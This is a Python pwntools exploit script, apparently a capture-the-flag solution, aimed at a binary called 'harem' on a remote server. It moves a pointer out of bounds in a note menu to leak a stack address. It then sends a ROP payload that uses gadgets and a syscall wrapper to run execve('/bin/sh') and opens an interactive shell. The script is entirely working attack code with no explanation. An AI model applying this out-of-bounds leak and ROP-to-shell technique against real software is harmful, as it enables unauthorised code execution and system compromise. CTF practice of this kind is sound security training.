#!/usr/bin/env python3
from pwn import *

def start():
    global p

    if args.REMOTE:
        p = remote("be.ax", 32564)
        # p = remote("localhost", 5000)
    else:
        p = elf.process()

def gdb_attach():
    if args.NOGDB or args.REMOTE:
        return
    
    gdb.attach(p, '''
            #    b *note_add + 875
            #    b *main +2593
            b *0x80009e2
    continue
    ''')

    input('ATTACHED?')

def sendchoice(choice: int):
    p.sendlineafter("> ", str(choice))

def ptr_forward():
    sendchoice(1)

def ptr_back():
    sendchoice(2)

def note_add(title: bytes, content: bytes):
    sendchoice(3)

    p.sendlineafter(": ", title)
    p.sendlineafter(": ", content)

def note_read():
    sendchoice(5)

context.binary = elf = ELF("./harem")
libc = elf.libc

pop_rdi_pop_4_leave = 0x0000000008002c11
pop_rsi_pop_3_leave = 0x0000000008002c13

start()

# if args.REMOTE:
    # challenge = p.recvline(False).split()[-1]

    # cmd = process(["pow", challenge])
    # p.sendline(cmd.recvline())
    # cmd.close()

gdb_attach()

idx = 8
# for i in range(-idx & 0xff):
    # ptr_back()

p.send(b'2\n'*(-idx & 0xff))

note_read()
p.recvuntil("title")
stack_leak = u64(b''.join([p.recvline(False).split(b': ')[-1] for _ in range(2)])[0x78:][:8])
print(hex(stack_leak))

payload = b'A'*14 + p64(stack_leak + 0x30) + p64(pop_rdi_pop_4_leave) + p64(0x3b) + b'/bin/sh\x00' + p64(0)*2 + p64(stack_leak + 0x58) + p64(pop_rsi_pop_3_leave) + p64(stack_leak + 0x18) + p64(0)*3 + p64(elf.sym['rt.syscall3'])

ptr_forward()
ptr_forward()
note_add(b'A'*32, payload) # 22

sendchoice(6)

p.interactive()
p.close()